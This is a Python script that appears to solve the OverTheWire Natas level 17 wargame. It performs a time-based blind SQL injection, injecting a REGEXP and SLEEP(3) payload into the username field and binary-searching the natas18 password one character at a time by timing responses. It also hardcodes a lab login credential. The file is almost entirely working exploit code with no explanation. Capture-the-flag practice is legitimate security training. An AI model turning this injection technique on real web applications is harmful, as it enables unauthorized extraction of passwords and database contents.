#!/bin/python3
# python3 blindsql.py "^WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
import urllib.request
import urllib.parse
import sys
import string
import time

char = string.digits+string.ascii_uppercase+string.ascii_lowercase
MAX = len(char)
password_len = 32

# create a password manager
password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw' 

# Add the username and password.
# If we knew the realm, we could use it instead of None.
top_level_url = 'http://natas17.natas.labs.overthewire.org'
password_mgr.add_password(None, top_level_url, username, password)

handler = urllib.request.HTTPBasicAuthHandler(password_mgr)

# create "opener" (OpenerDirector instance)
opener = urllib.request.build_opener(handler)

# use the opener to fetch a URL
url = 'http://natas17.natas.labs.overthewire.org/?debug=1'

# Install the opener.
# Now all calls to urllib.request.urlopen use our opener.
urllib.request.install_opener(opener)

user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
headers = { 'User-Agent' : user_agent }
qstart = 'natas18\" AND password COLLATE latin1_general_cs REGEXP \"^'
qend = '\" AND SLEEP(3); #'
matchStr = "This user exist"

def isMatch(values):
	data = urllib.parse.urlencode(values)
	binary_data = data.encode('ascii')
	starttime=time.time()
	req = urllib.request.Request(url, binary_data, headers)
	response = urllib.request.urlopen(req)
	endtime=time.time()	
	return ((endtime-starttime)>2.0)


def binarySearch(start, end, current):
	if start == (end - 1):
		return char[start]

	mid = (start + end) // 2
	testStr = char[start:mid]
	values = {'username' : qstart + current + '[' + testStr + ']' + qend}

	if isMatch(values):
		return binarySearch(start, mid, current)
	return binarySearch(mid, end, current)		
	
		
def main():
	searchStr = ""

	for pos in range(password_len):
		searchStr += binarySearch(0, MAX, searchStr)
		print (searchStr)

	print ("done")

main()

